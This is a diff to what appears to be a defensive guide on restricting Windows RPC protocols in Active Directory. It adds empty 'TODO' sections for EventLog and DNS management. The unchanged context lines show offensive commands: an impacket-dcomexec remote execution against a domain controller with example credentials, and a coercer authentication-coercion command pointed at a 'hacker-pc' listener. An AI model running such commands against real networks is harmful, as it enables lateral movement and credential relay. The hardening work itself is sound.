@@ -724,6 +724,8 @@ TODO: Rationale
 
 ### RPC over Named Pipes
 
+TODO
+
 ### \[MS-SCMR\]: Service Control Manager Remote Protocol
 
 ```shell
@@ -770,6 +772,10 @@ impacket-dcomexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
 wevtutil.exe /r:contoso-dc qe System /c:1
 ```
 
+### \[MS-EVEN\]: EventLog Remoting Protocol
+
+TODO
+
 ### \[MS-DFSNM\]: Distributed File System (DFS): Namespace Management Protocol
 
 Restrict to Domain Admins
@@ -789,6 +795,10 @@ TODO
 ```shell
 coercer coerce --target-ip contoso-dc --listener-ip hacker-pc --username john --password 'Pa$$w0rd' --domain contoso.com  --always-continue
 ```
+
+### \[MS-DNSP\]: Domain Name Service (DNS) Server Management Protocol
+
+TODO
 
 ## References
 
